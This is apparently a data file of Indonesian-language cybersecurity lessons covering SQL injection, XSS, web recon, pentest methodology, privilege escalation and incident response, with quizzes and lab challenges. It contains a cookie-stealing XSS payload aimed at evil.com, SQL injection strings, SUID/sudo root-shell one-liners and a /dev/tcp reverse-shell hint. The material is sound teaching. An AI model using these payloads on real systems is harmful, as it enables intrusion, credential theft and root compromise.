    ssl_certificate_key /etc/ssl/private/example.key;
    
    # TLS Version (hanya izinkan yang aman)
    # TODO:
    
    # Cipher Suites (hanya yang kuat)
    # TODO:
    
    # HSTS
    # TODO:
    
    # OCSP Stapling
    # TODO:
}`,
          hint: 'Hanya aktifkan TLS 1.2 dan 1.3. Gunakan cipher suite ECDHE dengan AES-GCM. HSTS minimum 31536000 detik.',
        },
        xp: 60,
      },
    ]
  },
  {
    id: 4, name: 'Web Application Security', icon: '🕸️', color: '#c084fc',
    topics: [
      {
        id: 'l4t1', title: 'OWASP Top 10 — SQLi & XSS', diff: 'intermediate',
        filename: 'owasp-sqli-xss.py',
        explain: `
<h3>OWASP Top 10 — Kerentanan Web Paling Umum</h3>
<p>OWASP (Open Web Application Security Project) menerbitkan daftar 10 kerentanan web yang paling berbahaya dan umum ditemukan.</p>
<h4>💉 A03: Injection — SQL Injection</h4>
<p>SQL Injection terjadi ketika input pengguna langsung digabungkan ke query SQL tanpa validasi.</p>
<p><strong>Contoh vulnerable:</strong></p>
<code>SELECT * FROM users WHERE username='$input'</code>
<p>Jika attacker input: <code>' OR '1'='1</code><br>
Query menjadi: <code>SELECT * FROM users WHERE username='' OR '1'='1'</code> → semua data keluar!</p>
<h4>🔒 Mitigasi SQLi</h4>
<ul>
  <li>Prepared statements / parameterized queries (WAJIB!)</li>
  <li>Input validation dan sanitization</li>
  <li>Principle of least privilege untuk database user</li>
  <li>WAF sebagai layer tambahan</li>
</ul>
<h4>📜 A07: XSS — Cross-Site Scripting</h4>
<p>Attacker menyisipkan script berbahaya ke halaman yang dilihat pengguna lain.</p>
<ul>
  <li><strong>Reflected XSS</strong> — Script di URL, langsung dieksekusi</li>
  <li><strong>Stored XSS</strong> — Script disimpan di database, dieksekusi setiap ada yang buka halaman</li>
  <li><strong>DOM XSS</strong> — Manipulasi DOM browser tanpa ke server</li>
</ul>
<div class="ct-danger-box">⛔ <span>Stored XSS di forum atau komentar adalah yang paling berbahaya — satu payload bisa mencuri cookie SEMUA user yang membuka halaman tersebut!</span></div>
`,
        example: `# === Vulnerable vs Secure Code ===

# ============================
# ❌ VULNERABLE — SQL Injection
# ============================
import sqlite3

def login_vulnerable(username, password):
    conn = sqlite3.connect('users.db')
    # ⚠️ BAHAYA: String formatting langsung!
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    result = conn.execute(query)
    return result.fetchone()

# Attacker input:
# username: admin' --
# Query: SELECT * FROM users WHERE username='admin' --' AND password='...'
# Komentar -- membuat password check diabaikan!

# ============================
# ✅ SECURE — Parameterized Query
# ============================
def login_secure(username, password):
    conn = sqlite3.connect('users.db')
    # ✓ AMAN: Parameter binding, bukan string concat
    query = "SELECT * FROM users WHERE username=? AND password=?"
    result = conn.execute(query, (username, password))
    return result.fetchone()

# ============================
# ❌ VULNERABLE — XSS
# ============================
# PHP: echo "<p>Halo, " . $_GET['name'] . "!</p>";
# Input: <script>document.location='http://evil.com/steal?c='+document.cookie</script>

# ============================
# ✅ SECURE — XSS Prevention
# ============================
from html import escape

def greet_secure(name):
    safe_name = escape(name)  # <script> → &lt;script&gt;
    return f"<p>Halo, {safe_name}!</p>"`,
        editorStarter: `# === Security Code Review Lab ===
# Temukan dan perbaiki kerentanan dalam kode berikut

import sqlite3
from flask import Flask, request

app = Flask(__name__)

# ============================
# KODE YANG PERLU DIAUDIT:
# ============================

@app.route('/search')
def search():
    keyword = request.args.get('q', '')
    # TODO: Apakah ini rentan XSS? Perbaiki!
    return f"<h1>Hasil untuk: {keyword}</h1>"

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    conn = sqlite3.connect('app.db')
    # TODO: Apakah ini rentan SQL Injection? Perbaiki!
    query = "SELECT * FROM users WHERE user='" + username + "' AND pass='" + password + "'"
    user = conn.execute(query).fetchone()
    
    if user:
        return "Login berhasil!"
    return "Login gagal"

@app.route('/profile')
def profile():
    user_id = request.args.get('id')
    conn = sqlite3.connect('app.db')
    # TODO: Vulnerable to IDOR dan SQLi, perbaiki!
    query = "SELECT * FROM profiles WHERE id=" + user_id
    profile = conn.execute(query).fetchone()
    return str(profile)`,
        editorTask: 'Identifikasi semua kerentanan (SQLi, XSS, IDOR) dan tulis versi yang sudah diperbaiki. Tambahkan komentar menjelaskan perbaikan.',
        terminalSim: `[pentester@kali ~]$ sqlmap -u "http://target.com/search?id=1" --dbs

    ___
   __H__
 ___ ___["]_____ ___ ___  {1.7.11}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   sqlmap.org

[*] Testing parameter: id
[*] Testing: AND boolean-based blind
[13:45:01] [INFO] GET parameter 'id' seems to be 'AND boolean-based blind' injectable

[13:45:12] [INFO] the back-end DBMS is MySQL
[*] Testing: UNION query
[13:45:15] [INFO] UNION query injectable

[*] Available databases:
  [*] information_schema
  [*] production_db
  [*] user_data  ← Found sensitive DB!

[*] Tables in 'user_data':
  [*] users (50,247 rows) — username, email, password_hash, credit_card!

⚠️  CRITICAL: Database exposed via SQL Injection!
    Affected: 50,247 user records including credit cards!`,
        quiz: {
          q: 'Cara paling efektif mencegah SQL Injection adalah?',
          options: ['Menyembunyikan error messages dari database', 'Menggunakan prepared statements / parameterized queries', 'Menggunakan firewall saja', 'Mengenkripsi data di database'],
          correct: 1,
          explanation: 'Prepared statements memisahkan kode SQL dari data input pengguna. Database engine memperlakukan input sebagai data murni, bukan sebagai bagian dari perintah SQL.',
        },
        challenge: {
          title: 'Secure Login System',
          desc: 'Buat fungsi login yang aman dalam Python/PHP yang tahan terhadap SQL Injection, Brute Force, dan menerapkan best practice keamanan modern.',
          starter: `# === Secure Authentication System ===
import sqlite3
import hashlib
import secrets
import time
from datetime import datetime

# Database setup
def setup_db():
    conn = sqlite3.connect('secure_auth.db')
    conn.execute("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            username TEXT UNIQUE,
            password_hash TEXT,
            salt TEXT,
            failed_attempts INTEGER DEFAULT 0,
            locked_until TEXT,
            created_at TEXT
        )
    """)
    conn.commit()
    return conn

# TODO: Buat fungsi hash_password(password) yang aman
# (gunakan salt + hashing yang kuat)

# TODO: Buat fungsi register_user(username, password)
# yang menyimpan password dengan aman

# TODO: Buat fungsi login(username, password)  
# yang: 1) aman dari SQLi 2) punya rate limiting
#       3) lock akun setelah 5 gagal

# TODO: Buat fungsi check_account_locked(username)`,
          hint: 'Gunakan parameterized queries, bcrypt/sha256+salt untuk hash, dan track failed_attempts. Lock akun 15 menit setelah 5 gagal.',
        },
        xp: 70,
      },
      {
        id: 'l4t2', title: 'Burp Suite & Web Recon', diff: 'intermediate',
        filename: 'web-recon.md',
        explain: `
<h3>Web Application Recon & Burp Suite</h3>
<p>Sebelum melakukan security testing, kita perlu memahami target — ini disebut reconnaissance (recon).</p>
<h4>🔍 Passive Recon (tanpa menyentuh target)</h4>
<ul>
  <li><strong>WHOIS</strong> — Info registrasi domain (pemilik, server)</li>
  <li><strong>DNS Enumeration</strong> — Subdomain, mail server, name server</li>
  <li><strong>Google Dorking</strong> — Cari informasi sensitif via Google</li>
  <li><strong>Shodan</strong> — Search engine untuk devices yang terkoneksi internet</li>
  <li><strong>OSINT</strong> — Open Source Intelligence (LinkedIn, GitHub, dll)</li>
</ul>
<h4>🔧 Active Recon (interaksi langsung)</h4>
<ul>
  <li><strong>Port scanning</strong> — Nmap untuk peta services yang berjalan</li>
  <li><strong>Directory brute-force</strong> — Gobuster/Dirsearch menemukan path tersembunyi</li>
  <li><strong>Technology fingerprinting</strong> — WhatWeb, Wappalyzer</li>
</ul>
<h4>🕷️ Burp Suite</h4>
<p>Burp Suite adalah toolkit lengkap untuk web application security testing.</p>
<ul>
  <li><strong>Proxy</strong> — Intercept dan modifikasi HTTP/S request/response</li>
  <li><strong>Repeater</strong> — Kirim ulang request dengan modifikasi</li>
  <li><strong>Intruder</strong> — Automated attacks (brute force, fuzzing)</li>
  <li><strong>Scanner</strong> — Automated vulnerability scanning (Pro)</li>
  <li><strong>Decoder</strong> — Encode/decode Base64, URL, dll</li>
</ul>
<div class="ct-tip-box">💡 <span>Burp Suite Community Edition gratis dan sudah sangat powerful untuk belajar! Selalu gunakan di lab/target yang kamu punya izin. Tanpa izin = ilegal!</span></div>
`,
        example: `# === Web Recon Toolkit Commands ===

# 1. WHOIS lookup
whois example.com

# 2. DNS Enumeration
dig example.com ANY        # Semua DNS records
dig example.com MX         # Mail servers  
host example.com           # Quick IP lookup

# 3. Subdomain Enumeration (pasif)
subfinder -d example.com
amass enum -passive -d example.com

# 4. Google Dorking (examples)
# site:example.com filetype:pdf          — PDF files
# site:example.com inurl:admin           — Admin panels
# site:example.com ext:sql               — Database files!
# inurl:wp-login.php site:example.com    — WordPress login
# "Index of" site:example.com           — Open directories

# 5. Directory brute-force
gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt

# 6. Technology fingerprinting
whatweb https://example.com
wafw00f https://example.com    # Detect WAF

# 7. Nmap web scan
nmap -sV -sC -p 80,443,8080,8443 example.com
nmap --script=http-title,http-headers example.com`,
        editorStarter: `# === Web Recon Report Template ===
# Target: [isi target domain - hanya target yang punya izin!]
# Date: 
# Tester: 

# =====================================
# PHASE 1: PASSIVE RECON
# =====================================

# 1.1 Domain Information (WHOIS)
Target Domain: 
Registrar: 
Registration Date: 
Expiry Date: 
Name Servers: 
Admin Contact: 

# 1.2 DNS Records Found
A Records: 
MX Records: 
TXT Records: 
Subdomains Found: 

# 1.3 Technology Stack (dari Shodan/Wappalyzer)
Web Server: 
Framework: 
CMS: 
CDN: 
WAF Detected: 

# =====================================
# PHASE 2: ACTIVE RECON
# =====================================

# 2.1 Open Ports
Port    Service    Version    Notes

# 2.2 Hidden Directories/Files
Path                Status    Interesting?

# 2.3 Interesting Findings
1. 
2. 
3. 

# =====================================
# PHASE 3: ATTACK SURFACE ANALYSIS
# =====================================
Login pages: 
Input forms: 
File upload: 
API endpoints: 
Authentication type: `,
        editorTask: 'Isi template recon report untuk domain lab/CTF yang kamu miliki. Dokumentasikan semua temuan dengan detail.',
        terminalSim: `[pentester@kali ~]$ gobuster dir -u http://lab.target.local -w /usr/share/seclists/Discovery/Web-Content/common.txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Meike (@_cmeike)
===============================================================
[+] Url:            http://lab.target.local
[+] Threads:        10
[+] Wordlist:       common.txt

/admin                (Status: 301) [→ /admin/]
/backup               (Status: 200) ⚠️  Open directory!
/config               (Status: 403) — Forbidden but exists
/uploads              (Status: 200) ⚠️  File upload directory!
/api                  (Status: 200) — API endpoint found
/phpinfo.php          (Status: 200) ⚠️  PHP info exposed!
/robots.txt           (Status: 200) — Check this!

Interesting findings:
  /backup/ → backup files accessible (DB dump?)
  /uploads/ → may allow file upload attacks
  /phpinfo.php → reveals full server config!
  /api → undocumented API to test`,
        quiz: {
          q: 'Apa yang dimaksud dengan "Google Dorking" dalam konteks keamanan?',
          options: ['Menyerang server Google', 'Menggunakan operator pencarian khusus untuk menemukan informasi sensitif yang terekspos', 'Membuat akun Google palsu', 'Bypass Google reCAPTCHA'],
          correct: 1,
          explanation: 'Google Dorking menggunakan operator pencarian lanjutan seperti site:, filetype:, inurl: untuk menemukan file sensitif, halaman login, atau data yang tidak sengaja terekspos ke internet.',
        },
        challenge: {
          title: 'CTF — Web Recon Challenge',
          desc: 'Buat rangkaian command recon lengkap untuk target CTF. Target: "vuln.lab.local". Temukan: teknologi yang digunakan, direktori tersembunyi, dan attack surface.',
          starter: `#!/bin/bash
# === CTF Recon Script ===
TARGET="vuln.lab.local"

echo "=== WEB RECON: $TARGET ==="

# 1. Basic connectivity
echo "[*] Ping test:"
# Command:

# 2. Port scan
echo "[*] Port scanning:"
# Command (TCP top 1000 ports + service detection):

# 3. Web technology fingerprint
echo "[*] Technology detection:"
# Command:

# 4. Directory bruteforce
echo "[*] Directory enumeration:"
# Command (dengan wordlist common.txt):

# 5. Check robots.txt dan sitemap
echo "[*] Checking robots.txt:"
# Command (curl):

# 6. Check HTTP headers
echo "[*] HTTP headers:"
# Command:

# 7. Screenshot all found pages
echo "[*] Capturing screenshots:"
# Command (gowitness / eyewitness):

echo "=== RECON COMPLETE ==="`,
          hint: 'Urutan recon: nmap → whatweb → gobuster → curl robots.txt → curl headers. Dokumentasikan setiap temuan!',
        },
        xp: 65,
      },
    ]
  },
  {
    id: 5, name: 'Penetration Testing', icon: '⚔️', color: '#f76a6a',
    topics: [
      {
        id: 'l5t1', title: 'Metodologi Pentesting', diff: 'intermediate',
        filename: 'pentest-methodology.md',
        explain: `
<h3>Metodologi Penetration Testing</h3>
<p>Penetration testing adalah proses mensimulasikan serangan nyata untuk menemukan kerentanan sebelum attacker sungguhan melakukannya.</p>
<h4>📋 Fase-fase Pentest (PTES)</h4>
<ol>
  <li><strong>Pre-engagement</strong> — Kontrak, scope, rules of engagement, timeline</li>
  <li><strong>Reconnaissance</strong> — Kumpulkan info tentang target (passive + active)</li>
  <li><strong>Scanning & Enumeration</strong> — Identifikasi services, versi, kerentanan</li>
  <li><strong>Exploitation</strong> — Eksploitasi kerentanan yang ditemukan</li>
  <li><strong>Post-Exploitation</strong> — Privilege escalation, lateral movement, persistence</li>
  <li><strong>Reporting</strong> — Dokumentasi temuan + rekomendasi</li>
</ol>
<h4>⚖️ Legal & Ethics</h4>
<ul>
  <li>SELALU dapatkan izin tertulis (Rules of Engagement) sebelum testing!</li>
  <li>Tentukan scope: IP range, domain, aplikasi apa yang boleh ditest</li>
  <li>Tentukan batasan: apa yang TIDAK boleh dilakukan</li>
  <li>Lakukan di waktu yang tidak mengganggu operasional bisnis</li>
</ul>
<div class="ct-danger-box">⛔ <span>Penetration testing tanpa izin tertulis adalah KEJAHATAN di hampir semua negara, termasuk Indonesia (UU ITE). Selalu pastikan kamu memiliki authorization sebelum memulai.</span></div>
<h4>📊 Jenis Pentest</h4>
<ul>
  <li><strong>Black Box</strong> — Tidak ada info tentang target (simulasi outsider)</li>
  <li><strong>White Box</strong> — Info lengkap (source code, arsitektur)</li>
  <li><strong>Grey Box</strong> — Info sebagian (credentials tapi tidak ada source code)</li>
</ul>
`,
        example: `# === Pentest Engagement Document (Template) ===

PROJECT: External Penetration Test
CLIENT: PT Example Indonesia
TESTER: [Your Name] / [Company]
DATE: January 15-19, 2024

## SCOPE (Authorized Targets):
IP Ranges:
  - 203.x.x.1 – 203.x.x.20 (Production servers)
  - 10.0.1.0/24 (Internal network, via VPN)

Domains:
  - example.com
  - api.example.com
  - admin.example.com

Applications:
  - Main web application
  - Mobile API (v2)

## OUT OF SCOPE (DO NOT TEST):
  - 203.x.x.50 (Third-party payment gateway)
  - Customer database (read-only access)
  - Social engineering attacks

## RULES OF ENGAGEMENT:
  - Testing window: Mon-Fri 22:00-06:00 WIB
  - No destructive testing (no data deletion)
  - Report critical findings immediately
  - Emergency contact: CTO: +62-xxx-xxxx

## EMERGENCY STOP:
  If production impact detected: STOP and call CTO`,
        editorStarter: `# === Pentest Report Template ===
# Lengkapi laporan pentest berikut

PENETRATION TEST REPORT
=======================
Client: 
Tester: 
Date: 
Report Classification: CONFIDENTIAL

# EXECUTIVE SUMMARY
# (Untuk manajemen non-teknis)
Overall Risk: [ ] Critical [ ] High [ ] Medium [ ] Low
Critical Findings: 
High Findings: 
Total Vulnerabilities: 

Key Message:


# TECHNICAL FINDINGS
# ------------------

Finding #1:
  Title: 
  Severity: [ ] Critical [ ] High [ ] Medium [ ] Low [ ] Info
  CVSS Score: 
  Affected System: 
  
  Description:
  
  
  Evidence:
  (Screenshot / command output)
  
  Impact:
  
  
  Remediation:
  
  
  References: CVE-XXXX-XXXXX

Finding #2:
  [Isi dengan temuan berikutnya]

# REMEDIATION ROADMAP
Priority 1 (Immediate - 24h): 
Priority 2 (Short-term - 1 week): 
Priority 3 (Long-term - 1 month): `,
        editorTask: 'Buat laporan pentest profesional berdasarkan template di atas. Isi dengan skenario fiktif yang realistis termasuk minimal 3 findings.',
        terminalSim: `[pentester@kali ~]$ msfconsole

     ,           ,
    /             \\
   ((__---,,,---__))
      (_) O O (_)
         \\ _ /
          | |
         / | \\
        |  |  |
Metasploit Framework 6.3.21

msf6 > search type:exploit name:eternalblue

Matching Modules:
   Name: exploit/windows/smb/ms17_010_eternalblue
   Disclosure Date: 2017-03-14
   Rank: average
   CVE: 2017-0143
   Description: MS17-010 EternalBlue SMB RCE (WannaCry)

msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 10.0.0.5
RHOSTS => 10.0.0.5
msf6 exploit(ms17_010_eternalblue) > run

[*] Started reverse TCP handler
[*] Sending stage to 10.0.0.5
[*] Meterpreter session 1 opened!

meterpreter > getuid
Server username: NT AUTHORITY\\SYSTEM  ← Full system access!

Note: This is a lab simulation. Never use on unauthorized systems!`,
        quiz: {
          q: 'Apa yang dimaksud dengan "scope" dalam penetration testing?',
          options: ['Software yang digunakan untuk scanning', 'Batasan target yang boleh ditest berdasarkan perjanjian', 'Laporan hasil pentest', 'Level akses pentest'],
          correct: 1,
          explanation: 'Scope mendefinisikan batas-batas target yang boleh ditest (IP, domain, aplikasi) berdasarkan perjanjian tertulis dengan klien. Testing di luar scope tanpa izin adalah tindakan ilegal.',
        },
        challenge: {
          title: 'Buat Rules of Engagement',
          desc: 'Kamu diminta melakukan pentest terhadap aplikasi e-commerce besar. Buat dokumen Rules of Engagement (RoE) lengkap yang melindungi kamu sebagai pentester dan klien.',
          starter: `# === RULES OF ENGAGEMENT (RoE) ===
# Penetration Test Authorization Document

CLIENT: PT E-Commerce Indonesia
TESTING FIRM: [Nama Perusahaan Kamu]
START DATE: 
END DATE: 

== AUTHORIZATION ==
Dokumen ini memberikan izin kepada [Tester] untuk melakukan
penetration testing terhadap sistem berikut:

AUTHORIZED SCOPE:
IP/Domain yang boleh ditest:
1. 
2. 
3. 

APPLICATIONS IN SCOPE:
1. 
2. 

== TIDAK BOLEH DILAKUKAN (PROHIBITED) ==
1. 
2. 
3. 
4. 

== TESTING WINDOW ==
Hari yang diizinkan: 
Jam yang diizinkan: 

== EMERGENCY PROCEDURES ==
Jika production terdampak:
1. 
2. 
Emergency contact: 

== ACCEPTED RISKS ==
Client menerima risiko bahwa testing mungkin menyebabkan:

== SIGNATURE ==
Client Representative: _______________ Date: ______
Lead Pentester: _____________________ Date: ______`,
          hint: 'RoE harus jelas, spesifik, dan melindungi kedua pihak. Semakin detail scope dan limitasinya, semakin baik!',
        },
        xp: 70,
      },
      {
        id: 'l5t2', title: 'Privilege Escalation', diff: 'advanced',
        filename: 'privesc.sh',
        explain: `
<h3>Privilege Escalation</h3>
<p>Setelah mendapatkan initial access (biasanya sebagai user biasa), attacker akan mencoba meningkatkan privilege menjadi root/SYSTEM untuk kontrol penuh.</p>
<h4>🐧 Linux Privilege Escalation</h4>
<ul>
  <li><strong>SUID/SGID Binaries</strong> — Program yang berjalan dengan hak pemilik (bukan user yang menjalankan)</li>
  <li><strong>Sudo Misconfiguration</strong> — <code>sudo -l</code> untuk lihat apa yang bisa dijalankan tanpa password</li>
  <li><strong>Cron Jobs</strong> — Script yang berjalan terjadwal dengan privilege tinggi</li>
  <li><strong>Writable /etc/passwd</strong> — Tambah user root baru jika writable!</li>
  <li><strong>Kernel Exploits</strong> — Exploit kerentanan di kernel Linux</li>
  <li><strong>Docker breakout</strong> — Keluar dari container ke host</li>
</ul>
<h4>🪟 Windows Privilege Escalation</h4>
<ul>
  <li><strong>AlwaysInstallElevated</strong> — Registry key yang memungkinkan install dengan SYSTEM</li>
  <li><strong>Unquoted Service Paths</strong> — Hijack path eksekusi service</li>
  <li><strong>Weak Service Permissions</strong> — Modify service yang berjalan sebagai SYSTEM</li>
  <li><strong>Token Impersonation</strong> — Steal/impersonate token privilege tinggi</li>
  <li><strong>DLL Hijacking</strong> — Replace DLL yang dimuat oleh program privilege tinggi</li>
</ul>
<div class="ct-tip-box">💡 <span>Tool wajib: LinPEAS/WinPEAS untuk automated privilege escalation enumeration. Jalankan di lab CTF untuk memahami semua vektor!</span></div>
`,
        example: `#!/bin/bash
# === Linux Privilege Escalation Checklist ===

echo "=== PrivEsc Enumeration ==="

# 1. Siapa kita sekarang?
id
whoami
sudo -l  # Apa yang bisa kita sudo?

# 2. SUID Binaries (bisa dieksploitasi)
find / -perm -4000 -type f 2>/dev/null
# Contoh berbahaya: /usr/bin/vim SUID
# → vim -c ':!/bin/bash' → SHELL SEBAGAI ROOT!

# 3. Writable files by root
find / -writable -type f 2>/dev/null | grep -v /proc

# 4. Cron jobs yang berjalan sebagai root
cat /etc/crontab
ls -la /etc/cron*
# Jika ada script yang writable → modifikasi untuk reverse shell!

# 5. Kernel version (untuk kernel exploits)
uname -a
cat /proc/version

# 6. Running processes sebagai root
ps aux | grep root

# 7. Network connections (pivot opportunity)
ss -antp
cat /etc/hosts

# 8. Interesting files
find / -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null
find / -name "id_rsa" 2>/dev/null   # SSH private keys!`,
        editorStarter: `#!/bin/bash
# === PrivEsc Investigation Script ===
# Kamu mendapat shell sebagai 'www-data' di web server
# Tujuan: Temukan cara eskalasi ke root

echo "=== STARTING PRIVESC ENUMERATION ==="
echo "Current user: $(id)"

# TASK 1: Cek sudo permissions
echo ""
echo "[*] Checking sudo permissions..."
# Command:

# TASK 2: Cari SUID binaries
echo ""
echo "[*] Searching SUID binaries..."
# Command (cari di /, exclude error messages):

# TASK 3: Cek cron jobs
echo ""
echo "[*] Checking cron jobs..."
# Command (lihat /etc/crontab dan cron.d):

# TASK 4: Cari file config dengan password
echo ""
echo "[*] Searching for credentials in config files..."
# Command (grep -r "password" di /var/www, /etc):

# TASK 5: Cek writable directories penting
echo ""
echo "[*] Checking writable system paths..."
# Command:

# TASK 6: Running services sebagai root
echo ""
echo "[*] Services running as root..."
# Command:

echo ""
echo "=== ENUMERATION COMPLETE ==="
echo "Review findings above for escalation vectors!"`,
        editorTask: 'Lengkapi script enumerasi privesc. Setiap bagian harus menggunakan command yang tepat untuk menemukan vektor eskalasi.',
        terminalSim: `www-data@server:~$ bash privesc.sh

=== STARTING PRIVESC ENUMERATION ===
Current user: uid=33(www-data)

[*] Checking sudo permissions...
Matching Defaults entries for www-data:
    env_reset, mail_badpass

User www-data may run the following commands:
    (root) NOPASSWD: /usr/bin/python3  ← VULNERABLE!

[*] Searching SUID binaries...
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/vim  ← SUID VIM! Escalation possible!

[*] Checking cron jobs...
* * * * * root /opt/backup.sh  ← Script yang berjalan sbg root!
# /opt/backup.sh permissions:
-rw-rw-rw- 1 root root /opt/backup.sh  ← WORLD WRITABLE!

ESCALATION VECTORS FOUND:
  1. sudo python3 -c 'import os; os.system("/bin/bash")'
  2. vim -c ':!/bin/bash' (SUID vim)
  3. Overwrite /opt/backup.sh dengan reverse shell
  
All three methods would yield ROOT!`,
        quiz: {
          q: 'Apa yang dimaksud SUID (Set User ID) bit pada file Linux dan mengapa berbahaya?',
          options: ['File yang dienkripsi', 'File yang berjalan dengan privilege pemilik file, bukan user yang menjalankannya', 'File yang dimiliki semua user', 'File yang tidak bisa dihapus'],
          correct: 1,
          explanation: 'SUID bit menyebabkan file berjalan dengan privilege pemiliknya. Jika /bin/bash punya SUID dan dimiliki root, siapapun yang menjalankan /bin/bash mendapat shell root — sangat berbahaya!',
        },
        challenge: {
          title: 'CTF PrivEsc Path',
          desc: 'Skenario CTF: Kamu punya shell sebagai "alice" (regular user). Ditemukan: (1) sudo vim tanpa password, (2) cron job /opt/monitor.sh yang writable. Tulis langkah eksploitasi KEDUA vektor ini.',
          starter: `# === CTF Challenge: Privilege Escalation ===
# User: alice
# Goal: Dapatkan shell ROOT

# ============================================
# VECTOR 1: Sudo VIM Exploitation
# ============================================
# alice bisa: sudo /usr/bin/vim tanpa password
# Bagaimana caranya mendapat shell root dengan ini?

# Step 1:

# Step 2: (Dalam VIM)

# Step 3:

# Result:

# ============================================
# VECTOR 2: Writable Cron Script
# ============================================
# /opt/monitor.sh berjalan sebagai root setiap menit
# File tersebut writable oleh alice
# Bagaimana caranya mendapat reverse shell root?

# Step 1: Setup listener di attacker machine
# Command:

# Step 2: Modifikasi /opt/monitor.sh
# Tambahkan payload:

# Step 3: Tunggu cron berjalan (max 1 menit)

# Step 4: Verifikasi akses root
# Command:`,
          hint: 'VIM: :!/bin/bash dalam command mode. Cron: tambahkan bash -i >& /dev/tcp/IP/PORT 0>&1 ke script.',
        },
        xp: 80,
      },
    ]
  },
  {
    id: 6, name: 'Digital Forensics', icon: '🔬', color: '#34d399',
    topics: [
      {
        id: 'l6t1', title: 'Incident Response (IR)', diff: 'intermediate',
        filename: 'incident-response.md',
        explain: `
<h3>Incident Response (IR)</h3>
<p>IR adalah proses terstruktur untuk menangani dan memulihkan dari insiden keamanan siber.</p>
<h4>📋 6 Fase NIST Incident Response</h4>
<ol>
  <li><strong>Preparation</strong> — Siapkan IR plan, tools, dan tim sebelum insiden terjadi</li>
  <li><strong>Detection & Analysis</strong> — Identifikasi apakah ini benar-benar insiden dan seberapa parah</li>
  <li><strong>Containment</strong> — Cegah penyebaran lebih lanjut (isolate sistem)</li>
  <li><strong>Eradication</strong> — Hapus penyebab insiden (malware, backdoor, akun rogue)</li>
  <li><strong>Recovery</strong> — Pulihkan sistem ke operasi normal yang aman</li>
  <li><strong>Post-Incident</strong> — Lesson learned, perbaiki prosedur</li>
</ol>
<h4>⚡ Prioritas Utama saat Insiden</h4>
<ul>
  <li><strong>Contain first</strong> — Jangan biarkan menyebar!</li>
  <li><strong>Preserve evidence</strong> — Jangan reboot, jangan hapus log</li>
  <li><strong>Document everything</strong> — Catat semua tindakan dengan timestamp</li>
  <li><strong>Communicate</strong> — Eskalasi ke manajemen dan tim hukum jika perlu</li>
</ul>
<h4>🔍 Indicators of Compromise (IoC)</h4>
<ul>
  <li>IP address atau domain mencurigakan dalam log</li>
  <li>File hash yang cocok dengan malware database</li>
  <li>Proses asing yang berjalan di sistem</li>
  <li>Network traffic keluar ke IP yang tidak dikenal</li>
  <li>Login dari lokasi/waktu yang tidak biasa</li>
</ul>
`,
        example: `# === Incident Response Playbook — Ransomware ===

PHASE 1: DETECTION
  Trigger: Antivirus alert + users melaporkan file tidak bisa dibuka
  
  Initial Assessment:
  - Identifikasi mesin yang terinfeksi
  - Tentukan ransomware family (ekstensi file, ransom note)
  - Estimasi scope: satu mesin atau menyebar?

PHASE 2: CONTAINMENT (SEGERA!)
  [ ] Isolate infected machines dari network (cabut kabel/disable wifi)
  [ ] Tidak reboot! (Memory forensics masih bisa dilakukan)
  [ ] Blokir C2 IP/domain di firewall
  [ ] Disable network shares sementara
  [ ] Preserve memory dump: winpmem.exe -o memory.dmp

PHASE 3: ERADICATION
  [ ] Identifikasi patient zero (siapa yang pertama terinfeksi)
  [ ] Temukan initial vector (phishing email? RDP? USB?)
  [ ] Hapus malware dari sistem yang bisa dibersihkan
  [ ] Reset credential semua akun yang mungkin compromised
  [ ] Patch vulnerability yang dieksploitasi

PHASE 4: RECOVERY
  [ ] Restore dari backup yang bersih
  [ ] Verifikasi integritas backup sebelum restore
  [ ] Monitor ketat setelah restore
  [ ] Notify stakeholders

PHASE 5: POST-INCIDENT
  [ ] Root cause analysis
  [ ] Update IR playbook
  [ ] Security awareness training
  [ ] Improve detection rules (SIEM)`,
        editorStarter: `# === Incident Response Report ===
# Isi laporan IR berikut berdasarkan skenario

SKENARIO:
Senin pagi, 08:15 WIB. Alert masuk dari SIEM:
"Unusual outbound traffic to 185.220.xxx.xxx - 50GB dalam 2 jam"
Beberapa karyawan melaporkan laptop lambat.
IT menemukan proses asing: "svch0st.exe" (perhatikan angka 0, bukan huruf O)

INCIDENT RESPONSE REPORT:
========================
Incident ID: IR-2024-001
Date Detected: 
Severity: [ ] P1-Critical [ ] P2-High [ ] P3-Medium
Type: [ ] Data Breach [ ] Ransomware [ ] Malware [ ] DDoS [ ] Other

TIMELINE:
08:00 - [isi kejadian yang mungkin terjadi]
08:15 - SIEM Alert received
08:20 - [tindakan pertama IR tim]
...

INITIAL ANALYSIS:
- Affected systems (estimasi):
- IoCs found:
  * IP:
  * File hash:
  * Process:
  * Registry key:

IMMEDIATE ACTIONS TAKEN:
1. [dalam 15 menit pertama]
2.
3.

CONTAINMENT MEASURES:
-

ERADICATION PLAN:
1.
2.

RECOVERY PLAN:
-

LESSONS LEARNED:
1.
2.`,
        editorTask: 'Isi laporan IR lengkap untuk skenario di atas. Ikuti timeline yang logis dan langkah-langkah IR yang profesional.',
        terminalSim: `[analyst@soc ~]$ # SIEM Alert Triggered — Investigating...

[analyst@soc ~]$ grep "185.220" /var/log/firewall.log | head -20
Jan 15 06:12:01 ALLOW OUT 10.0.1.45 → 185.220.xxx.xxx:443 TCP 8MB
Jan 15 06:13:15 ALLOW OUT 10.0.1.45 → 185.220.xxx.xxx:443 TCP 12MB
(... thousands of entries ...)
Total outbound: 52.3GB in 2 hours

[analyst@soc ~]$ # Checking affected host: 10.0.1.45
[analyst@soc ~]$ ssh analyst@10.0.1.45 "ps aux | grep svch"
alice    3821  98.2 15.3 svch0st.exe   ← SUSPICIOUS!

[analyst@soc ~]$ ssh analyst@10.0.1.45 "netstat -an | grep 185.220"
ESTABLISHED 10.0.1.45:52341 185.220.xxx.xxx:443

[analyst@soc ~]$ sha256sum svch0st.exe
a1b2c3...  → VirusTotal: MALICIOUS! Stealer trojan (58/72 engines)

VERDICT: Data exfiltration confirmed!
AFFECTED: 1 host identified (10.0.1.45)
EXFILTRATED: ~52GB data
